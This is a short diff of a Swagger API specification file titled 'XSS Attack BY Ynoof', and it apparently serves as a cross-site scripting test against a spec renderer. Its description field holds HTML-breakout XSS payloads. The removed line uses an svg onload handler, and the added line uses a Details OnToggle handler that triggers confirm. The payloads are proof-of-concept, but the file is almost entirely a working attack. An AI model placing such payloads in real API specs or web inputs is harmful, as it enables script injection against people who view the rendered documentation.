@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY Ynoof
   description: |
-    <xmp><p title="</xmp><svg onload=alert(1)>">aasas
+    '"<!--><Details Open OnToggle=confirm`1`>
   version: production
 basePath: /JSSResource/
 produces:
